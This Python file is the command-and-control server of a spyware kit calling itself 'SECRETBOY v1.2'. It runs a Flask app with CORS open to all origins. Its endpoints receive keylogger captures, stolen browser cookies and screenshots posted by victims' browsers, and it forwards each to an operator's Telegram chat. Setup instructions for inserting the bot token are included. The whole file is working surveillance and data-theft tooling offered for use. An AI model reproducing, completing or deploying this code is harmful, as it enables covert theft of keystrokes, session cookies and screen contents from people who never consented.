import os
import json
import base64
import telebot
import sys
from flask import Flask, request
from flask_cors import CORS

# --- CONFIG ---
# Replace these with your real Telegram Bot credentials
TOKEN = "YOUR_TELEGRAM_BOT_TOKEN_HERE"
CHAT_ID = "YOUR_CHAT_ID_HERE"  

def check_config():
    """Checks if the bot token is configured and provides English instructions."""
    if TOKEN == "YOUR_TELEGRAM_BOT_TOKEN_HERE" or ":" not in TOKEN:
        print("\n" + "!"*60)
        print("ERROR: TELEGRAM BOT TOKEN IS MISSING OR INVALID!")
        print("!"*60)
        print(f"\nHow to fix this:")
        print(f"1. Open the file:  nano {os.path.basename(__file__)}")
        print(f"2. Locate the line: TOKEN = \"{TOKEN}\"")
        print(f"3. Replace it with your actual Bot Token from @BotFather.")
        print(f"4. Replace CHAT_ID with your personal Telegram ID.")
        print(f"5. Save and Exit: Press Ctrl+O, Enter, then Ctrl+X.")
        print("\n" + "!"*60 + "\n")
        sys.exit(1)

app = Flask(__name__)
CORS(app)

def show_banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print("\033[1;36m" + r"""
  ███████╗███████╗ ██████╗██████╗ ███████╗████████╗██████╗  ██████╗ ██╗   ██╗
  ██╔════╝██╔════╝██╔════╝██╔══██╗██╔════╝╚══██╔══╝██╔══██╗██╔═══██╗╚██╗ ██╔╝
  ███████╗█████╗  ██║     ██████╔╝█████╗     ██║   ██████╔╝██║   ██║ ╚████╔╝ 
  ╚════██║██╔══╝  ██║     ██╔══██╗██╔══╝     ██║   ██╔══██╗██║   ██║  ╚██╔╝  
  ███████║███████╗╚██████╗██║  ██║███████╗   ██║   ██████╔╝╚██████╔╝   ██║  
    """ + "\033[1;31m" + "\n           [ BY N0MERC ] [ SECRETBOY v1.2 ]\033[0m")

@app.route('/log', methods=['POST'])
def handle_logs():
    data = json.loads(request.data)
    bot.send_message(CHAT_ID, f" **KEYLOG**\nURL: {data['url']}\nData: `{data['data']}`", parse_mode="Markdown")
    return "OK"

@app.route('/cookies', methods=['POST'])
def handle_cookies():
    data = json.loads(request.data)
    bot.send_message(CHAT_ID, f" **COOKIE**\nSite: {data['site']}\nData: `{data['cookies']}`", parse_mode="Markdown")
    return "OK"

@app.route('/screenshot', methods=['POST'])
def handle_screenshot():
    data = json.loads(request.data)
    img_base64 = data['image'].split(",")[1]
    with open("temp_sc.jpg", "wb") as f:
        f.write(base64.b64decode(img_base64))
    with open("temp_sc.jpg", "rb") as photo:
        bot.send_photo(CHAT_ID, photo, caption=f"📸 **SCREENSHOT**\nURL: {data['url']}", parse_mode="Markdown")
    return "OK"

if __name__ == "__main__":
    show_banner()
    check_config() # This will stop execution if the token is not set
    
    # Initialize bot only after check passes
    bot = telebot.TeleBot(TOKEN)
    print(f"[*] C2 Server is starting on port 5000...")
    app.run(host='0.0.0.0', port=5000)
